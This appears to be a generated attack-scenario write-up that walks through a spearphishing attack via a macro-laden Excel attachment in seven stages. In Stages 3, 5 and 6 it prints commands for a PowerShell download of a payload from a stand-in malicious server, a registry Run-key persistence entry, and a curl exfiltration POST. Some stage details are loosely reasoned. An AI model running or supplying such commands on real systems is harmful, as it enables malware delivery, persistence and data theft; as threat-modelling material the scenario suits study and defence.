<output>
Pattern Name: Spearphishing Attachment

Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment that exploits a vulnerability in Microsoft Excel. The attack progresses from the initial email interaction to the execution of a payload, leveraging various applications and user actions throughout the process.

Attack Flow Breakdown:

**Stage 1: Initial Access via Email**
- **Application Involved**: Microsoft Outlook
- **User Action**: The user receives an email with a subject line "Important Update" and an attachment named "Invoice_2023.xlsx".
- **Key Artifacts**: Email headers, attachment file "Invoice_2023.xlsx".

```shell
# The user opens the email in Outlook and clicks on the attachment.
# This action triggers the download of the file to the user's local system.
```

**Stage 2: Opening the Malicious Attachment**
- **Application Involved**: Microsoft Excel
- **User Action**: The user double-clicks the attachment to open it in Excel.
- **Key Artifacts**: Excel file "Invoice_2023.xlsx" containing embedded macros.

```shell
# The user opens the Excel file, which contains malicious macros.
# The macros are designed to execute a PowerShell command to download a payload.
```

**Stage 3: Macro Execution**
- **Application Involved**: Microsoft Excel (macro execution context)
- **User Action**: The user is prompted to enable macros to view the content of the invoice.
- **Key Artifacts**: Macro code that executes a PowerShell command.

```shell
# The user enables macros, triggering the execution of the embedded PowerShell command.
# This command downloads a malicious payload from a remote server.
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe' -OutFile 'C:\Users\%USERNAME%\AppData\Local\Temp\payload.exe'"
```

**Stage 4: Payload Execution**
- **Application Involved**: Windows Command Prompt (cmd.exe)
- **User Action**: The macro executes the downloaded payload.
- **Key Artifacts**: Executable file "payload.exe" located in the Temp directory.

```shell
# The downloaded payload is executed silently.
C:\Users\%USERNAME%\AppData\Local\Temp\payload.exe
```

**Stage 5: Establishing Persistence**
- **Application Involved**: Windows Registry, Task Scheduler
- **User Action**: The payload modifies the registry to establish persistence.
- **Key Artifacts**: Registry keys for persistence.

```shell
# The payload creates a registry entry to ensure it runs at startup.
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousPayload" /t REG_SZ /d "C:\Users\%USERNAME%\AppData\Local\Temp\payload.exe" /f
```

**Stage 6: Data Exfiltration**
- **Application Involved**: Web Browser (e.g., Chrome)
- **User Action**: The payload initiates a connection to a command and control (C2) server to exfiltrate data.
- **Key Artifacts**: Network traffic to the C2 server.

```shell
# The payload sends sensitive data to the attacker's server.
curl -X POST -d "data=exfiltrated_data" http://malicious-server.com/exfil
```

**Stage 7: Cleanup**
- **Application Involved**: Windows Explorer
- **User Action**: The user may delete the original email or attachment.
- **Key Artifacts**: Deleted email and attachment.

```shell
# The user deletes the email to cover tracks, but the payload remains active.
```

</output>